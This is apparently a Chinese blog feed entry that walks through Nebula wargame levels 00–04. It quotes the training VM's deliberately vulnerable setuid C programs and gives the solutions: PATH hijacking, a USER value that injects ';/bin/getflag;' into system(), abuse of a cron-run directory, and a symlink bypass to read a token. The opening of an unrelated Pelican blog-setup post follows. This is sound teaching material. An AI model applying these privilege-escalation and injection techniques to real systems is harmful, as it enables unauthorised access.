&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Nebula
----------------------------------------------------------------------------------------------
Download        exploit-exercises-nebula-5.iso
----------------------------------------------------------------------------------------------
Version         5
----------------------------------------------------------------------------------------------
Changes         Moved from OVA to bootable CD format. Reduces issues with importing OVA files.
----------------------------------------------------------------------------------------------
SHA1 Checksum   e82f807be06100bf3e048f82e899fb1fecc24e3a
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;统一规则&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;每次任务使用任务的level账户登录并执行flag账户权限可执行的getflag文件（一般是这个名字）。比如，任务1使用level01账户，密码也为level01，你需要去寻找方法获取flag01才可以执行的getflag文件并执行它。&lt;/li&gt;
&lt;li&gt;当需要系统配置时，使用nebula账户，密码也为nebula，并利用sudo执行需要root权限的操作。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Nebula level00&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;This level requires you to find a Set User ID program that will run as the "flag00" account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.&lt;/p&gt;
&lt;p&gt;Alternatively, look at the find man page.&lt;/p&gt;
&lt;p&gt;该题要求寻找一个可以SetUID的程序（该程序属于flag00账户）并运行它。你可以从/（根目录）开始寻找。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;目标很明确，搜索一下属于flag00账户的带有SetUID权限的程序即可。果断man find，搜索一下和权限相关的参数，找到&lt;code&gt;-perm&lt;/code&gt;，并且看到该参数后加入&lt;code&gt;-mode&lt;/code&gt;可以指定匹配所有具有这个权限的文件（注意和&lt;code&gt;mode&lt;/code&gt;及&lt;code&gt;/mode&lt;/code&gt;的区别，这个&lt;code&gt;-&lt;/code&gt;意味着权限的包含关系）。&lt;/p&gt;
&lt;p&gt;到这儿我们需要回顾一下Linux下权限的表示方式：Linux的fs中，所有文件/目录/设备等都具有三个级别的用户权限控制，分别是u所有者，g所属群组，o其他用户。对于每个级别，又能分别控制r读w写x执行权限。另外，还有SetUID和SetGID的特殊权限位。&lt;/p&gt;
&lt;p&gt;权限表示的时候，rwx和无权限&lt;code&gt;-&lt;/code&gt;分别用数字4210表示，并执行位或运算，这样一个级别的用户权限就可以表示了（占用一个byte）。这种方法可以表示出三个不同用户级别的权限。同时加入最前面8bits的特殊权限位，就可以用4byte表示这个文件的完整权限。&lt;/p&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;u       g       o
rwx     r--     r--     &lt;span class="m"&gt;0744&lt;/span&gt;
rwx     ---     ---     &lt;span class="m"&gt;0700&lt;/span&gt;
rws     rwx     rwx     &lt;span class="m"&gt;4777&lt;/span&gt;
rws     rws     rwx     &lt;span class="m"&gt;6777&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;按照这个标准，我们这儿需要搜索的文件需要SetUID，因此可以构造权限表示为-u=s或者-4000，再考虑到针对文件搜索（限定类型为文件），因此可以构造如下命令（两者一致）。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;find / -perm -u&lt;span class="o"&gt;=&lt;/span&gt;s -type f -user flag00 &amp;gt; flag.txt
find / -perm -4000 -type f -user flag00 &amp;gt; flag.txt
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;之后查看flag.txt中内容，可以发现搜索到两个文件，执行第一个&lt;code&gt;/bin/.../flag00&lt;/code&gt;即可过关。&lt;/p&gt;
&lt;h1&gt;Nebula level01&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?&lt;/p&gt;
&lt;p&gt;题目说程序有漏洞允许任意程序执行。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;envp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kt"&gt;gid_t&lt;/span&gt; &lt;span class="n"&gt;gid&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;uid_t&lt;/span&gt; &lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;gid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getegid&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
  &lt;span class="n"&gt;uid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;geteuid&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;

  &lt;span class="n"&gt;setresgid&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;gid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;gid&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;setresuid&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

  &lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/usr/bin/env echo and now what?&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;程序逻辑很简单：SetUID和SetGID后执行环境变量指定的echo文件，这样&lt;code&gt;and now what?&lt;/code&gt;就是参数。因此马上能得到如下思路：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;看到&lt;code&gt;/usr/bin/env&lt;/code&gt;就立即反应过来可以从环境变量下手，修改后优先执行自己的程序。&lt;/li&gt;
&lt;li&gt;需要运行getflag，而程序只能运行echo，因此要把echo和getflag关联上。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;于是乎一气呵成执行以下命令：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ln -s /bin/getflag &lt;span class="nb"&gt;echo&lt;/span&gt;
&lt;span class="nv"&gt;PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/home/level01:&lt;span class="nv"&gt;$PATH&lt;/span&gt;
&lt;span class="nb"&gt;cd&lt;/span&gt; /home/flag01
./flag01
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这里软连接需要创建在&lt;code&gt;/home/level01&lt;/code&gt;或&lt;code&gt;/tmp&lt;/code&gt;中，否则没有w权限。至此，此题拿下。&lt;/p&gt;
&lt;h1&gt;Nebula level02&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?&lt;/p&gt;
&lt;p&gt;和上一题一样的题干，还是找到可任意执行程序的漏洞。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;envp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="kt"&gt;gid_t&lt;/span&gt; &lt;span class="n"&gt;gid&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;uid_t&lt;/span&gt; &lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="n"&gt;gid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getegid&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
  &lt;span class="n"&gt;uid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;geteuid&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;

  &lt;span class="n"&gt;setresgid&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;gid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;gid&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;setresuid&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

  &lt;span class="n"&gt;buffer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="n"&gt;asprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/bin/echo %s is cool&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;getenv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;USER&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
  &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;about to call system(&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;%s&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;)&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

  &lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;还是环境变量，这次是$USER，反而简单了，直接截断原来的程序即可。上代码：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nv"&gt;USER&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;;/bin/getflag;&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Over :D&lt;/p&gt;
&lt;h1&gt;Nebula level03&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Check the home directory of flag03 and take note of the files there.&lt;/p&gt;
&lt;p&gt;There is a crontab that is called every couple of minutes.&lt;/p&gt;
&lt;p&gt;题目说检查flag03的home目录，注意里面的文件，同时有一个crontab任务每2分钟执行一次。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;发现writeable.d目录和writeable.sh脚本。脚本内容如下：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt; i in /home/flag03/writeable.d/* &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
    &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;ulimit&lt;/span&gt; -t &lt;span class="m"&gt;5&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; bash -x &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
    rm -f &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="k"&gt;done&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;其中&lt;code&gt;ulmint -t 5&lt;/code&gt;控制CPU时间不超过5秒，&lt;code&gt;bash -x "$i"&lt;/code&gt;用于执行$i文件。执行完之后删除文件本身。因此，只需要在writeable.d目录下创建文件并执行指令即可。文件内容如下：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/bin/getflag &amp;gt; result.txt
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;等待一段时间，系统会触发这个.sh脚本，之后去看result.txt文件即可发现getflag已经执行。&lt;/p&gt;
&lt;p&gt;当然，这儿如果要看具体的crontab的任务事件，用nebula账户登录，执行&lt;code&gt;sudo crontab -u flag03 -l&lt;/code&gt;即可。&lt;/p&gt;
&lt;h1&gt;Nebula level04&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)&lt;/p&gt;
&lt;p&gt;寻找方法绕开读取限制，读取token文件内容。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;fcntl.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;envp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
  &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;rc&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argc&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;%s [file to read]&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
    &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;

  &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;strstr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;token&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;You may not access &amp;#39;%s&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
    &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;

  &lt;span class="n"&gt;fd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;O_RDONLY&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fd&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;err&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Unable to open %s&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;

  &lt;span class="n"&gt;rc&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;

  &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;rc&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;err&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Unable to read fd %d&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;

  &lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;rc&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;flag04的home目录下有属于level04组的flag04可执行文件和一个token文件（无权限），因此需要调用flag04来读取token。
首先分析程序逻辑，程序有一个参数，但参数名不能是token（和前面一样，用软连接）。之后会读取这个参数为名字的文件，并把文件内容输出到屏幕（1是STD_OUT）。由于flag04目录没有w权限，因此软连接要创建到自己的家目录中。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ln -s /home/flag04/token ~/flag04passwd
/home/flag04/flag04 ~/flag04passwd
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;之后读取home目录下flag04passwd内容，为flag04密码，用flag04账户和获取的密码登陆后getflag。&lt;/p&gt;</content><category term="exploit-exercises"></category><category term="nebula"></category><category term="wargame"></category><category term="hacking"></category><category term="exploit"></category></entry><entry><title>利用Pelican在Github上搭建博客</title><link href="http://blog.yyx.me/posts/build-blog-on-github-by-pelican.html" rel="alternate"></link><published>2014-08-14T16:17:00-07:00</published><updated>2014-08-14T16:17:00-07:00</updated><author><name>YYX</name></author><id>tag:blog.yyx.me,2014-08-14:/posts/build-blog-on-github-by-pelican.html</id><summary type="html">&lt;p&gt;主要介绍利用Pelican静态博客生成系统和Github Page搭建个人博客的完整方法，其中包括各个组件的下载、安装、Pelican的基本语法等内容。同时后半篇讨论了Pelican主题制作等相关问题。&lt;/p&gt;</summary><content type="html">&lt;h1&gt;写在前面&lt;/h1&gt;
&lt;p&gt;一直知道Github有Page功能，但是从来没想到把它用来做Blog。那天突然发现静态博客系统Jekyll，让我这种用惯Wordpress的人顿感欣喜，简单、轻量、纯粹的博客才是那个真正的博客。静态博客有着自己的优势，比如速度快，安全性高，同时Github的免费空间足够大(300M)，还提供CDN，甚至可以绑定域名。这比免费动态主机、自己买个虚拟空间或VPS架个动态CMS都要来的划算。最最重要的是，Github本身是分布式机制的，这样你的文章完全就是在本地写(妈妈再也不用担心断网了)，之后sync到服务器即可，相当于多重备份+Git强大的版本管理。不过Jekyll基于Ruby，个人对于Ruby只有耳闻没有尝试，因此只能作罢(当然也放弃了Octopress之类基于Jekyll的)，于此同时google到了基于Python的静态博客系统Pelican，因此开始折腾。一周后自制主题的Blog总算竣工，因此决定撰文以方便后人。&lt;/p&gt;
&lt;p&gt;OK，在正式开始之前还要说几点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;虽然静态博客系统有很多优势，但是也有很多缺陷。当然大部分缺陷可以用一些小hint来弥补，这对于优势来说还是可以接受的，当然你需要既然决然的去折腾。&lt;/li&gt;
&lt;li&gt;网上Jekyll系+Github建博客的文章很多，Pelican也不算特别少，因此本文力求写出一些不一样的、有营养的东西。&lt;/li&gt;
&lt;li&gt;Pelican升级时候配置文件做了较大变化(虽然我认为对于接口或配置的不严谨设置与改动是不可取的)，不排除其他工具或环境的版本升级时候的变化。如不幸碰到，请自行查阅相关工具或环境的手册，RTFM :D。 &lt;/li&gt;
&lt;li&gt;成文仓促，水平有限，望不吝赐教。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;So, let's start...&lt;/p&gt;
&lt;h1&gt;基础准备&lt;/h1&gt;
&lt;h2&gt;系统环境&lt;/h2&gt;
&lt;p&gt;由于平时办公环境还是以Win7为主，因此还是决定将环境搭建在Windows下。Linux下搭建环境比Windows更加简单，网上也有相关文章，请自行检索。&lt;/p&gt;
&lt;h2&gt;套件选择&lt;/h2&gt;
&lt;p&gt;必装：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Python3 (2 or 3你自己纠结去)&lt;/li&gt;
&lt;li&gt;pip和setuptool(为了方便package的安装)&lt;/li&gt;
&lt;li&gt;Pelican3&lt;/li&gt;
&lt;li&gt;Markdown（个人觉得Markdown语法简洁优美，Pelican3还支持其他语法）&lt;/li&gt;
&lt;li&gt;make工具（GNU的make，win下的nmake不行）&lt;/li&gt;
